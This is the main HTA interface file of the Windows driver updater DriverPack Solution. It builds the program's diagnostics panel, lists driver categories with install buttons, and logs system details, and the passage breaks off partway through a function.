<!--[if gt IE 6]>
<!DOCTYPE html>
<![endif]-->
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title>DriverPack Solution</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta HTTP-EQUIV="MSThemeCompatible" content="yes">
<!-- ToDo: Add emulation of different browser versions if need be -->
<meta http-equiv="X-UA-Compatible" content="IE=Edge" />
<link rel="shortcut icon" href="tools\Icon.ico" type="image/x-icon" />
<meta http-equiv="X-UA-Compatible" content="requiresActiveX=true" />
<noscript>
	<meta http-equiv="refresh" content="5;URL='http://drp.su/error/noscript/'">
</noscript>

<script type="text/javascript" src="tools\modules\init.js"></script>
<script type="text/javascript" src="tools\Branding\branding.js"></script>
<script type="text/javascript" src="tools\modules\variables.js"></script>
<script type="text/javascript">revis = ' $Rev: 416 $ '; revis = revis.replace(/\$/gi,"").replace(/Rev: /gi,"R");</script>
<script type="text/javascript" src="tools\config.js"></script>
<script type="text/javascript" src="tools\modules\resize.js"></script>

<HTA:APPLICATION ID="dpa"
	application="yes"
	applicationName="DriverPack Solution"
	borderStyle="normal"
	caption="yes"
	contextMenu="yes"
	icon="./tools/Icon.ico"
	innerBorder="no"
	maximizeButton="yes"
	minimizeButton="yes"
	navigable="yes"
	scroll="yes"
	scrollFlat="no"
	selection="no"
	showInTaskBar="yes"
	singleInstance="no"
	sysMenu="yes"
	version="0.1"
	windowState="normal"/>

<script type="text/javascript" src="tools\modules\lng\language.js"></script>
<script type="text/javascript" src="tools\modules\error.js"></script>
<script type="text/javascript" src="tools\modules\bugreport.js"></script>
<script type="text/javascript" src="tools\modules\wpi.js"></script>
<script type="text/javascript" src="tools\modules\notebook.js"></script>
<script type="text/javascript" src="tools\modules\checkOS.js"></script>
<script type="text/javascript" src="tools\modules\antivirus.js"></script>
<script type="text/javascript" src="tools\modules\jquery.tools.min.js"></script>
<!--<script type="text/javascript" src="tools\modules\jquery.tools-1.4.2.min.js"></script>-->
<script type="text/javascript" src="tools\modules\openingGlav.js"></script>
<script type="text/javascript" src="tools\modules\onExit.js"></script>
<script type="text/javascript" src="tools\modules\jquery.hotkeys-0.7.9.js"></script>
<script type="text/javascript" src="tools\modules\hotkeys.js"></script>
<link rel="stylesheet" type="text/css" href="tools\modules\lng\dd.css" />
<script type="text/javascript" src="tools\modules\lng\jquery.dd.js"></script>
<script type="text/javascript" src="tools\modules\drvsign\drvsign.js"></script>
<script type="text/javascript" src="tools\modules\infobarautoreboot.js"></script>
<script type="text/javascript" src="tools\modules\startpack.js"></script>
<script type="text/javascript" src="tools\modules\touch\touch.js"></script>

<!-- Diagnostics -->
<script type="text/javascript" src="tools\modules\notice.js"></script>
<script type="text/javascript" src="tools\modules\diagnostics\system.js"></script>
<script type="text/javascript" src="tools\modules\CPU\OpenHardwareMonitorId.js"></script>
<script type="text/javascript" src="tools\modules\diagnostics\cpuz.js"></script>
<script type="text/javascript" src="tools\modules\diagnostics\cpu.js"></script>
<script type="text/javascript" src="tools\modules\diagnostics\bios.js"></script>
<script type="text/javascript" src="tools\modules\diagnostics\ramTest.js"></script>
<script type="text/javascript" src="tools\modules\diagnostics\avScanner.js"></script>
<script type="text/javascript" src="tools\modules\diagnostics\defrag.js"></script>
<script type="text/javascript" src="tools\modules\diagnostics\hdd.js"></script>
<script type="text/javascript" src="tools\modules\diagnostics\hddSmart.js"></script>
<!-- Diagnostics -->

<script type="text/javascript" src="tools\modules\checkPacks.js"></script>

<!--[if lt IE 7]>
	<![if gte IE 5.5]>
	<script type="text/javascript" src="tools\modules\fixpng.js"></script>
	<style type="text/css">
	.iePNG, IMG { filter:expression(fixPNG(this)); }
	.iePNG A { position: relative; }/* style for links with PNG as background */
	</style>
	<![endif]>
<![endif]-->

    <!-- HTML5 shim, for IE6-8 support of HTML5 elements -->
    <!--[if lt IE 9]>
      <script src="tools\modules\bootstrap\html5.js"></script>
    <![endif]-->

    <!-- Bootstrap -->
    <link href="tools\modules\bootstrap\css\bootstrap.min.css" rel="stylesheet">
    <link href="tools\modules\bootstrap\css\bootstrap-responsive.min1.css" rel="stylesheet">

	<script src="tools\modules\bootstrap\js\bootstrap.min.js"></script>
	<!--[if IE 6]>
		<link href="tools\modules\bootstrap\ie6.css" rel="stylesheet">
		<style type="text/css">
			input{ width:auto !important; }
			.panel-top { width:200px; }
			.panel {
				position:absolute !important;
			}
		</style>
    <![endif]-->
	<!-- Bootstrap -->
	

<link href="tools\style.css" rel="stylesheet" type="text/css">
</head>

<body>
<div id="preloading"><img src="tools\load8.gif"></div>
<table height="100%" border="0" class="panel" id="panel" width="200">
  <tr style="vertical-align:top;">
	<td class="panel-top" width="335">

	  <p id="button_refresh">
		<img
		  src="tools\ico\6.png"
		><a
		  href="javascript:void(0)" onclick="refresh(); return false;" id="button_refresh"
		><script>l('button_refresh')</script></a>
	  </p>

	  <p id="button_devmgmt">
		<img
		  src="tools\ico\1.png"
		><a
		  href="javascript:void(0)"
		  onclick="devmgmt(); return false;"
		><script>l('button_devmgmt')</script></a>
	  </p>

	  <p id="button_devmgmt">
		<img
		  src="tools\ico\5.png"
		><a
		  href="javascript:void(0)"
		  onclick="appwiz(); return false;"
		><script>l('button_appwiz')</script></a>
	  </p>


	  <p id="settings_mode" style="font-size:11px;padding-left:0px;padding-top:10px;margin-left:5px;">
		  <input type="checkbox" name="chk_settings_mode" id="chk_settings_mode" onclick="toggle_settings_mode(this.checked);"
		  > <a href="javascript:void(0)" onClick="toggle_settings_mode(changeBox('chk_settings_mode'));return false;"
		  > â†“ <script>l('button_settings')</script></a>
	  </p>


	  <div id="advanced" style="display:none;">
		<p class="advancedcontrol" id="expert_mode">
		  <input type="checkbox" name="chk_expert_mode" id="chk_expert_mode" onclick="toggle_expert_mode(this.checked);"
		  ><a href="javascript:void(0)" onClick="toggle_expert_mode(changeBox('chk_expert_mode'));return false;"
		  ><script>l('button_expert_mode')</script></a>
		</p>

		<!--
		<p class="advancedcontrol">
		  <input type="checkbox" name="chk_signIgnor" id="chk_signIgnor" checked onclick="saveParam0('signIgnor',this.checked); chk_signIgnor_Click();"
		  ><a href="javascript:void(0)" onClick="saveParam0('signIgnor',changeBox('chk_signIgnor'));chk_signIgnor_Click();return false;"
		  ><script>l('button_signIgnor')</script>
		  </a>
		</p>
		-->

		<p class="advancedcontrol">
		  <input type="checkbox" name="chk_logsCurFolder" id="chk_logsCurFolder" checked onclick="saveParam0('logsCurFolder',this.checked);"
		  ><a href="javascript:void(0)" onClick="saveParam0('logsCurFolder',changeBox('chk_logsCurFolder'));return false;"
		  ><script>l('button_logsCurFolder')</script>
		  </a>
		</p>

		<div id="bloat">
		<p class="advancedcontrol">
		  <input type="checkbox" name="chk_CPUtemp" id="chk_CPUtemp" checked onclick="saveParam('getCPUtemp',this.checked);"
		  ><a href="javascript:void(0)" onClick="saveParam('getCPUtemp',changeBox('chk_CPUtemp'));return false;"
		  ><script>l('button_CPUtemp')</script>
		  </a>
		</p>

		<p class="advancedcontrol">
		  <input type="checkbox" name="chk_DrvUpdater" id="chk_DrvUpdater";"
		  ><a href="javascript:void(0)" id="chk_DrvUpdater1" onClick="saveParam('DrvUpdater',changeBox('chk_DrvUpdater'));DrvUpdaterUninstall();return false;"
		  ><script>l('button_activeDrvUpdater')</script>
		  </a>
		</p>

		<p class="advancedcontrol">
		  <input type="checkbox" name="chk_OEMInstall" id="chk_OEMInstall";"
		  ><a href="javascript:void(0)" id="chk_OEMInstall1" onClick="saveParam('OEMInstall',changeBox('chk_OEMInstall'));return false;"
		  ><script>l('button_OEMInstall')</script>
		  </a>
		</p>

		</div>
	  </div>
	  <div id="logo"><br><br><span style="padding-left:60px;"><img id="logo-img" src="tools\ico\med_logo.png"/></span><br><img id="logo-text" src="tools\ico\logo-text.png"/><br><center><img id="logo-brand" src="tools\Branding\logo.png"/></center></div>

	</td>
	<td class="tooglePanel" onMouseDown="tooglePanel()"></td>
  </tr>

  <tr valign="top">
	<td class="panel-bottom" height="100">

		<!-- <b style="font-size:16px;"><script>l('button_lang')</script></b> -->
		<div style="margin-left:5px;">
		<select name="language" id="language" style="width:150px;visibility:hidden;" onChange="language_onChange(this);" style="font-size:9pt;"></select>
		</div>
		<br>
		<br>

	  <p><img src="tools\ico\3.png"
		><a href="#" id="bug" onclick="BugReport(); return false;"
		><script>l('button_bug')</script></a>
	  </p>

<!--
	  <p><img src="tools\ico\7.png"
		><a href="#"  onclick="about(); return false;"
		><script>l('button_about')</script></a>
	  </p>
-->
	  <p><img src="tools\ico\14.png"
		><a href="#"  onclick="downloadDRP(); return false;"
		><script>l('button_configurator')</script></a>
	  </p>

	  <p><img src="tools\ico\2.png"
		><a href="#" onclick="help(); return false;"
		><script>l('button_help')</script></a>
	  </p>

	   <!-- Social Buttons-->
		<span id="social">
			<a href="http://vkontakte.ru/driverpacksolution" onclick="goToUrl('http://vkontakte.ru/driverpacksolution');return false;">
				<img src="tools\ico\social\vkontakte.png" width="20" height="20" />
			</a>

			<a href="http://www.facebook.com/DriverPack.Solution.Russia" onclick="if (rusLang) { goToUrl('http://www.facebook.com/DriverPack.Solution.Russia'); } else { goToUrl('http://www.facebook.com/DriverPack.Solution'); } return false;">
				<img src="tools\ico\social\facebook.png" width="20" height="20" />
			</a>

			<a href="http://twitter.com/DRP_Su" onclick="goToUrl('http://twitter.com/DRP_Su');return false;">
				<img src="tools\ico\social\twitter.png" width="20" height="20" />
			</a>

			<a href="http://www.youtube.com/user/driverpack" onclick="goToUrl('http://www.youtube.com/user/driverpack');return false;">
				<img src="tools\ico\social\youtube.png" width="20" height="20" />
			</a>
		</span>
	   <!-- END Social Buttons-->

	  <span id="version">v<script>document.write(version+revis)</script></span>
	</td>
	<td class="tooglePanel" onMouseDown="tooglePanel()"></td>
  </tr>
</table>

<div id="nav-arrow" onMouseDown="tooglePanel()">||</div>


<table width="100%" height="100%" border="0" cellpadding="0" cellspacing="0" id="mainW">
  <tr>
	<td height="100%" class="panel-table"></td>
	<td class="main-table">
	  <table
		height="100%"
		width="100%"
		border="0"
		cellpadding="0"
		cellspacing="0"
	  >
		<tr style="vertical-align:top;">
		  <td>
			 <!--
			 <h1>
			   <script>l('con_title12')</script>
			 </h1>
			 -->
			<div id="diagnostics-alert"></div>
			 <a
			   class="dropddownbutton"
			   id="con_diagnostics"
			   onMouseDown="dropddownbutton_Down('img_0','div_0')"
			   onMouseOver="dropddownbutton_Over('img_0','div_0')"
			   onMouseOut= "dropddownbutton_Out('img_0','div_0')"
			   onMouseUp=  "dropddownbutton_Up('img_0','div_0')"
			 >
			   <table width="100%">
				 <tr>
				   <td width="19">
					 <img
					   src="tools/ico/9.png"
					   style="filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='tools\ico\9.png')"
					   align="baseline"
					   id="img_0"
					   class="dropdownimg"
					   >
				   </td>
				   
				   <td>
					<span id="con_diagnostics_title"><script>l('con_diagnostics')</script></span>
				   </td>

				   <td width="100%">
					 <hr size="1" id="diagnostics_hr">
				   </td>
				 </tr>
			   </table>
			</a>
			
			   <div id="div_0">
				 <div id="sys_info">
				   <table id="sys_info_table" border=0>
					 <tr>
					   <!--<td width="60"> IE6-->
					   <td width="90">
						 <script>l('system_comp')</script>
					   </td>

					   <td colspan=2>
						 <a href="javascript:void(0)" onclick='msinfo(); return false;' style="text-decoration:underline;">
						   <script>document.write("<span onmousemove=\"return ttlOver(event, '"+button_msinfo+"')\" onmouseout='return ttlOut()'>" + ManufacturerClean(Manufacturer) + " " + Model.replace(ManufacturerClean(Manufacturer),'') + "</span>");</script>
						 </a>
					   </td>
					 </tr>

					 <tr>
					   <td>
						 <script>l('system_BIOS')</script>
					   </td>

					   <td colspan=2>
						   <script>document.write(ManufacturerClean(wpi('Manufacturer','Win32_BIOS')) + ' ' + wpi('SMBIOSBIOSVersion','Win32_BIOS'));</script>
						   <!--<script>document.write("Vendor: " + wpi('Manufacturer','Win32_BIOS') + " SMBIOSBIOSVersion: " + wpi('SMBIOSBIOSVersion','Win32_BIOS') + " Name: " + wpi('Name','Win32_BIOS'));</script>-->
					   </td>
					 </tr>

					 <tr>
					   <td>
						 <script>l('system_processor')</script>
					   </td>

					   <td><center><a href="#" onclick="alert(cpuInfo); return false;"><span id="cpu_temperature"></span></a> <a href="javascript:void(0)" onclick="toogleCPUtemp(); return false;"><script>document.write("<span onmousemove=\"return ttlOver(event, '"+system_procTemp.replace(/ :: /gi,"<br>")+"')\" onmouseout='return ttlOut()'><img src='tools\\ico\\6-white.png' id='cpu_img'></span>");</script></a></center></td>
						<script>
						if (getCPUtemp){
							var getCPUautorun = true;
							cpu_get();
						}
						</script>
					   <td>
						 <script>document.write(CPU);</script>
						 <span id="cpu_warning"></span>
					   </td>
					 </tr>

					 <tr>
					   <td>
						 <script>l('system_memory')</script>
					   </td>

					   <td>
						<button class="btn btn-mini btn-diag tooltips" id="ramTest-button" onclick='ramTest()'><script>l('ramTest_button')</script></button>
						<script>document.getElementById('ramTest-button').title=ramTest_buttonTitle</script>
					   </td>

					   <td>
						 <script>document.write((RAM/1024).toPrecision(2));</script>Gb

					   </td>
					 </tr>

					 <tr>
					   <td>
						 <script>l('system_HDD')</script>
					   </td>

					   <td>
						<button class="btn btn-mini btn-diag tooltips" id="defrag-button" onclick="defrag()"><script>l('defrag_button')</script></button>
						<script>document.getElementById('defrag-button').title=defrag_buttonTitle</script>
					   </td>

					   <td>
						<span id="hdd_alert"></span>
						<script>hdd_detect();</script>
						<span id="hddFreeSpace_alert"></span>
						<script>hddFreeSpace_detect();</script>
						<span id="hddSmart_alert"></span>
						<script>hddSmart_detect();</script>
					   </td>
					 </tr>
<!--
					 <tr>
					   <td>
						 <script>l('system_video')</script>
					   </td>

					   <td></td>

					   <td>
						 <span id="system_video"><script>document.write(GPU);</script></span>
					   </td>
					 </tr>
-->
					 <tr>
					   <td>
						 <script>l('system_winsystem')</script>
					   </td>

					   <td>
					    <button class="btn btn-mini btn-diag tooltips" id="cleanWin-button" onclick="try { WshShell.Run('cleanmgr.exe', 1, true); } catch (e){}"><script>l('cleanWin_button')</script></button>
						<script>document.getElementById('cleanWin-button').title=cleanWin_buttonTitle</script>
					   </td>

					   <td>
						 <script>
							document.write(wpi('Caption','Win32_OperatingSystem').replace(/Microsoft /i,"") + " " +
								wpi('CSDVersion','Win32_OperatingSystem').replace(/Service Pack /i,"SP") + " " +
								wpi('OSArchitecture','Win32_OperatingSystem'));
						   var instDate = wpi('InstallDate','Win32_OperatingSystem').substr(0,8);
						   instDate = instDate.substr(0,4) + "/" + instDate.substr(4,2) + "/" + instDate.substr(6,2);

						   var nextDay = new Date(Date.parse(instDate));
						   var msPerDay = 24 * 60 * 60 * 1000;
						   var daysLeft = Math.round((today.getTime() - nextDay.getTime()) / msPerDay);

						   document.write(" (" + daysLeft + " " + morfolog('system_Date_Day',daysLeft) + ".)");
						 </script>
						 <span id="hint_instDate" style="display:none;">
						   <script>
							 document.write("<a title='" + system_instDate_hint +
								"'> <img src='tools\\ico\\3.png' style='margin:0px; padding:0px;'> " +
								system_instDate_hint_title + "</a>");
						   </script>
						 </span>
					   </td>
					 </tr>
					 <tr>
					   <td>
						 <script>l('antivirus_title')</script>
					   </td>

					   <td>
						<button class="btn btn-mini btn-diag tooltips" id="avScanner-button" onclick="avScanner()"><script>l('avScanner_button')</script></button>
						<script>document.getElementById('avScanner-button').title=avScanner_buttonTitle</script>
					   </td>

					   <td>
						 <span id="antivirus_alert"></span>
						 <script>antivirus_detect();</script>

						 <span id="avStatus_alert"></span>
						 <script>avStatus_alert();</script>
					   </td>
					 </tr>				 
				   </table>
				
					<div>
						<span id="servicePack_alert"></span>
						<script>CheckServicePack();</script>
					</div>				   
					
			   </div>
		   </div>
<script>
	//ToDo: Add to config opportunity not to turn
	dropddownbutton_Up('img_0','div_0');
</script>
<div id="tabs">
<ul class="tab">
	<li id="tab-driver" onmousedown="infobar_driver()"><a href="#" onclick="return false;"><span><script>l('infobar_tabDriver')</script> <b class="badge badge-warning" id="badge-drivers">0</b></span></a></li>

	<li id="tab-programm" onmousedown="infobar_programm()"><a href="#" onclick="return false;"><span><script>l('infobar_tabProgramm')</script> <b class="badge badge-warning" id="badge-programms">0</b></span></a></li>
	<li id="tab-advanced" onmousedown="infobar_drvAdvanced()" style="display:none;"><a href="#" onclick="return false;"><span><script>l('infobar_advanced')</script></span></a></li>
	<li id="tab-search" onmousedown="infobar_drvNone()" style="display:none;"><a href="#" onclick="return false;"><span><script>l('infobar_tabOnline')</script></span></a></li>
	<li><a href="#" onmousedown="return false;" id="infobar_tabAdd" style="display:none;"><span><script>l('infobar_tabAdd')</script></span></a></li>
</ul>
</div>
		<table id="infobar">
			<tr id="infobar-tr">
				<td id="infobar_color"></td>
				<td>
					<img id="infobar_img" src="tools\ico\infobar\loading.png"/>
					<div id="infobar_title"><script>l('infobar_titleLoading')</script></div>
					<div id="infobar_info"><img src="tools/load.gif"> <script>l('infobar_infoLoading')</script></div>
				</td>
			</tr>
		</table>
		
<div id="notice"></div>
<div style="visibility:hidden;">_____________________________________________</div>

<div id="drv_lists">
		<!--
			 1 Missing drivers (drivers available)
			 driver_available
		-->
		   <div id="driver_available_list" style="display:block;">
			 <a
			   class="dropddownbutton"
			   onMouseDown="dropddownbutton_Down('driver_available_img','driver_available_div')"
			   onMouseOver="dropddownbutton_Over('driver_available_img','driver_available_div')"
			   onMouseOut="dropddownbutton_Out('driver_available_img','driver_available_div')"
			   onMouseUp="dropddownbutton_Up('driver_available_img','driver_available_div')"
			 >
			 <div id="driver_available_sep">
				<table>
				 <tr>
				   <td width="19">
					 <img
					   src="tools\modules\blank.gif"
					   style="filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='tools\ico\8.png')"
					   align="baseline"
					   id="driver_available_img"
					   class="dropdownimg"
					   >
				   </td>
				   <td>
					<span id="con_driver_available"><script>l('con_driver_available')</script> - <span id="driver_available_num">0</span></span>
				   </td>
			   </table>
			 </div>
			 </a>
			 <hr>
			 <div id="driver_available_div" style="display:none">
				 <div id="driver_available"></div>
				 <br>
			 </div>
		   </div>

		<!--
			 2 Missing drivers (unknown)
			 no_driver
		-->
		   <div id="no_driver_list" style="display:block;">
			 <a
			   class="dropddownbutton"
			   onMouseDown="dropddownbutton_Down('no_driver_img','no_driver_div')"
			   onMouseOver="dropddownbutton_Over('no_driver_img','no_driver_div')"
			   onMouseOut="dropddownbutton_Out('no_driver_img','no_driver_div')"
			   onMouseUp="dropddownbutton_Up('no_driver_img','no_driver_div')"
			 >
			 <div id="driver_list_sep" style="display:none">
			   	<table>
				 <tr>
				   <td width="19">
					 <img
					   src="tools\modules\blank.gif"
					   style="filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='tools\ico\8.png')"
					   align="baseline"
					   id="no_driver_img"
					   class="dropdownimg"
					   >
				   </td>				   
				   <td>
					<span id="con_no_driver"><script>l('con_no_driver')</script> - <span id="no_driver_num">0</span></span>
				   </td>
				 </tr>
			   </table>
			 </div>
			 </a>
			 <div id="no_driver_div" style="display:none">
				 <div id="no_driver"></div>
				 <br>
			 </div>
		   </div>

		<!--
			 3 Installed drivers (updates available)
			 driver_new
		-->
		   <div id="driver_new_list" style="display:block;">
			 <a
			   class="dropddownbutton"
			   onMouseDown="dropddownbutton_Down('driver_new_img','driver_new_div')"
			   onMouseOver="dropddownbutton_Over('driver_new_img','driver_new_div')"
			   onMouseOut="dropddownbutton_Out('driver_new_img','driver_new_div')"
			   onMouseUp="dropddownbutton_Up('driver_new_img','driver_new_div')"
			 >
			 <div id="driver_new_sep">
			   	<table>
				 <tr>
				   <td width="19">
					 <img
					   src="tools\modules\blank.gif"
					   style="filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='tools\ico\9.png')"
					   align="baseline"
					   id="driver_new_img"
					   class="dropdownimg"
					   >
				   </td>				   
				   <td>
					<span id="con_driver_new"><script>l('con_driver_new')</script> - <span id="driver_new_num">0</span></span>
				   </td>
				 </tr>
			   </table>
			 </div>
			 </a>
			 <hr>
			 <div id="driver_new_div" style="display:none">
				 <div id="driver_new"></div>
				 <br>
			 </div>
		   </div>


		<!--
			 6 Installed drivers (unknown)
			 driver_unknown
		-->
		   <div id="driver_unknown_list" style="display:block;">
			 <a
			   class="dropddownbutton"
			   onMouseDown="dropddownbutton_Down('driver_unknown_img','driver_unknown_div')"
			   onMouseOver="dropddownbutton_Over('driver_unknown_img','driver_unknown_div')"
			   onMouseOut="dropddownbutton_Out('driver_unknown_img','driver_unknown_div')"
			   onMouseUp="dropddownbutton_Up('driver_unknown_img','driver_unknown_div')"
			 >
			   	<table>
				 <tr>
				   <td width="19">
					 <img
					   src="tools\modules\blank.gif"
					   style="filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='tools\ico\9.png')"
					   align="baseline"
					   id="driver_unknown_img"
					   class="dropdownimg"
					   >
				   </td>				   
				   <td>
					<span id="con_driver_unknown"><script>l('con_driver_unknown')</script> - <span id="driver_unknown_num">0</span></span>
				   </td>
				 </tr>
			   </table>
			 </a>
			 <hr>
			 <div id="driver_unknown_div" style="display:none">
				 <div id="driver_unknown"></div>
				 <br>
			 </div>
		   </div>


		<!--
			 4 Installed drivers (up to date)
			 driver_uptodate
		-->
		   <div id="driver_uptodate_list" style="display:block;">
			 <a
			   class="dropddownbutton"
			   onMouseDown="dropddownbutton_Down('driver_uptodate_img','driver_uptodate_div')"
			   onMouseOver="dropddownbutton_Over('driver_uptodate_img','driver_uptodate_div')"
			   onMouseOut="dropddownbutton_Out('driver_uptodate_img','driver_uptodate_div')"
			   onMouseUp="dropddownbutton_Up('driver_uptodate_img','driver_uptodate_div')"
			 >
			   	<table>
				 <tr>
				   <td width="19">
					 <img
					   src="tools\modules\blank.gif"
					   style="filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='tools\ico\9.png')"
					   align="baseline"
					   id="driver_uptodate_img"
					   class="dropdownimg"
					   >
				   </td>				   
				   <td>
					<span id="con_driver_uptodate"><script>l('con_driver_uptodate')</script> - <span id="driver_uptodate_num">0</span></span>
				   </td>
				 </tr>
			   </table>
			 </a>
			 <hr>
			 <div id="driver_uptodate_div" style="display:none">
				 <div id="driver_uptodate"></div>
				 <br>
			 </div>
		   </div>

		<!--
			 5 Installed drivers (old driverpacks)
			 driver_old
		-->
		   <div id="driver_old_list" style="display:block;">
			 <a
			   class="dropddownbutton"
			   onMouseDown="dropddownbutton_Down('driver_old_img','driver_old_div')"
			   onMouseOver="dropddownbutton_Over('driver_old_img','driver_old_div')"
			   onMouseOut="dropddownbutton_Out('driver_old_img','driver_old_div')"
			   onMouseUp="dropddownbutton_Up('driver_old_img','driver_old_div')"
			 >
			   	<table>
				 <tr>
				   <td width="19">
					 <img
					   src="tools\modules\blank.gif"
					   style="filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='tools\ico\9.png')"
					   align="baseline"
					   id="driver_old_img"
					   class="dropdownimg"
					   >
				   </td>				   
				   <td>
					<span id="con_driver_old"><script>l('con_driver_old')</script> - <span id="driver_old_num">0</span></span>
				   </td>
				 </tr>
			   </table>
			 </a>
			 <hr>
			 <div id="driver_old_div" style="display:none">
				 <div id="driver_old"></div>
				 <br>
			 </div>
		   </div>

		<!--
			 7 Installed drivers (standard)
			 driver_standard
		-->
		   <div id="driver_standard_list" style="display:block;">
			 <a
			   class="dropddownbutton"
			   onMouseDown="dropddownbutton_Down('driver_standard_img','driver_standard_div')"
			   onMouseOver="dropddownbutton_Over('driver_standard_img','driver_standard_div')"
			   onMouseOut="dropddownbutton_Out('driver_standard_img','driver_standard_div')"
			   onMouseUp="dropddownbutton_Up('driver_standard_img','driver_standard_div')"
			 >
			   	<table>
				 <tr>
				   <td width="19">
					 <img
					   src="tools\modules\blank.gif"
					   style="filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='tools\ico\9.png')"
					   align="baseline"
					   id="driver_standard_img"
					   class="dropdownimg"
					   >
				   </td>				   
				   <td>
					<span id="con_driver_standard"><script>l('con_driver_standard')</script> - <span id="driver_standard_num">0</span></span>
				   </td>
				 </tr>
			   </table>
			 </a>
			 <hr>
			 <div id="driver_standard_div" style="display:none">
				 <div id="driver_standard"></div>
				 <br>
			 </div>
		   </div>

		<!--
			 8 All driverpacks
			 driverpacks
		-->
			 <div id="driverpacks_list" style="display:block;">
			   <a
				 class="dropddownbutton"
				 onMouseDown="dropddownbutton_Down('driverpacks_img','driverpacks_div')"
				 onMouseOver="dropddownbutton_Over('driverpacks_img','driverpacks_div')"
				 onMouseOut="dropddownbutton_Out('driverpacks_img','driverpacks_div')"
				 onMouseUp="dropddownbutton_Up('driverpacks_img','driverpacks_div')"
			   >
				<table>
				 <tr>
				   <td width="19">
					 <img
					   src="tools\modules\blank.gif"
					   style="filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='tools\ico\9.png')"
					   align="baseline"
					   id="driverpacks_img"
					   class="dropdownimg"
					   >
				   </td>				   
				   <td>
					<span id="con_driverpacks"><script>l('con_driverpacks')</script> - <span id="driverpacks_num">0</span></span>
				   </td>
				 </tr>
			   </table>
			   </a>
			   <hr>
			   <div id="driverpacks_div" style="display:none">
				   <div id="driverpacks"></div>
				   <br>
			   </div>
			 </div>
	
	
	<div id="button_forManualInst">
	  <span id="button_chkAll">
		<a
		  href="javascript:void(0)"
		  class="btn btn-small btn-info"
		  onclick="chkAll(); return false;"
		><i class="icon-check icon-white"></i> <script>l('button_chkAll')</script></a>
	  </span>
	  <span id="button_instAll">
		<a
		  href="javascript:void(0)"
		  class="btn btn-small btn-success"
		  onclick="run_button(true,function(){refresh_perform_task();});return false;"
		><span id="runButton"><script>l('button_instAll')</script></span> (<span id="chkCnt">0</span>)</a>
	  </span>
	</div>
	<br><br><br>
</div>

			 <div id="message"><script>l('con_tryManualMode')</script></div>
		  </td>
		</tr>
	  </table>
	</td>
  </tr>
</table>

<script type="text/javascript">
	function preloading(){
		document.getElementById('preloading').style.display='none';
		document.getElementById('panel').style.visibility='visible';
		document.getElementById('mainW').style.visibility='visible';
	}
	preloading();
</script>

<!-- {{{{{ Entry point {{{{{ -->
<script type="text/javascript" src="tools\modules\startup.js"></script>

<script type="text/javascript">
function hidePanel(){
	$('.panel').animate({left: '-=200px'}, 2000);
	$('.panel-table').css('min-width','0px');
	$('.panel-table').animate({width: '0px'}, 2000);
}
function showPanel(){
	$('.panel').animate({left: '+=200px'}, 2000);
	$('.panel-table').animate({width: '+=200px'}, 2000,function() {
		$('.panel-table').css('min-width','200px');
	});
}
var tooglePanelMode=true;
function tooglePanel(mode){
	if ((mode!="undefined")&&(mode==tooglePanelMode)) { return false; }

	if (!tooglePanelMode){
		showPanel();
		tooglePanelMode=true;
	}
	else {
		hidePanel();
		tooglePanelMode=false;
	}
}
function hideOrShow(tab,mode){
	if (tab) document.getElementById(tab).style.display=mode?"none":"block";
}
function loadParam(value,to){
	lf('loadParam');
	document.getElementById(to).checked = value;
}

loadParam(getCPUtemp,'chk_CPUtemp');
loadParam(logsCurFolder,'chk_logsCurFolder');
//loadParam(DrvUpdater,'chk_DrvUpdater');
//loadParam(OEMInstall,'chk_OEMInstall');
loadParam(expertMode,'chk_expert_mode');

silentInstall=true;
forceInstall=true;
//loadParam(signIgnor,'chk_signIgnor');
if (disableCurDir) {
	document.getElementById('chk_logsCurFolder').disabled = "disabled";
	logsCurFolder = false;
}

try{ cmdFolder = dpa.commandLine.split('drp=')[1].split('"')[1]; }
catch(e){ cmdFolder = ''; }
drpFolder = (cmdFolder?cmdFolder+'\\drp':drpFolder);
//alert(drpFolder);


var logfile;
	try{
		//ToDo: Admin rights via launcher. And to remove this condition.
		//if (!(OSVersion >= 6 && OSVersion != 6.2 && dpa.commandLine.indexOf('Run') == "-1"))
		logfile = fso.CreateTextFile(pathLogFile("log__"), true);
	}
	catch(e){logfile = null;}

document.body.style.cursor="auto";
if (is64){
	dpinst="dpinst64.exe";
	devcon="devcon64.exe";
}
log("DriverPack Solution " + version + " "+ verType + " (" +
	buildDate + ", " + revis + ")");
log("Version: " + wpi('Caption','Win32_OperatingSystem') + " " +
	wpi('CSDVersion','Win32_OperatingSystem').replace(/Service Pack /i,"SP") + " " +
	wpi('OSArchitecture','Win32_OperatingSystem')+" ["+OSVersion+"]");

log("Architecture: " + (is64?"64-bit":"32-bit"));
log("CPU: " + CPU);
log("GPU: " + GPU);
 log("RAM: " + Math.round(RAM) + " MB");
if ((daysLeft < 3) && (parseInt(document.getElementById('driver_available_num').innerHTML) != 0))
		document.getElementById('hint_instDate').style.display = "";

var today2 = new Date();
var nextDay2 = new Date(Date.parse(buildDate));
var msPerDay2 = 24 * 60 * 60 * 1000;
var daysLeft2 = Math.round((today2.getTime() - nextDay2.getTime()) / msPerDay2);
log("The "+ScriptEngine()+" version is "+ScriptEngineMajorVersion() + "."+ScriptEngineMinorVersion()+" Build "+ScriptEngineBuildVersion());
log("Today: " + today2);
log("env_windir=" + env_windir);
log("env_SystemRoot=" + env_SystemRoot);
log("env_SystemDrive=" + env_SystemDrive);
log("env_temp=" + temp);
log("Locale: "+locale.toString(16));

if (daysLeft2 > 365 && confirm(alert_askUpdate))
	goToUrl('http://drp.su/');
// }}}}} Entry point }}}}}


function changeBox(itemid) {
	lf('changeBox');
	var cbox = document.getElementById(itemid);
	try { var box = eval(cbox); }
	catch(e) {}
	return box.checked = !box.checked;
}

function set_lists(a1,a2,a3,a4,a5,a6,a7,a8,b1,b2,b3,b4,b5,b6,b7,b8){
	
	if (a3=='none') { hideOrShow('button_forManualInst',true); } //To display the "Select All" - "Install" tab only "driver"
	else { hideOrShow('button_forManualInst',false); }
	
	document.getElementById('driver_available_div').style.display = a1;
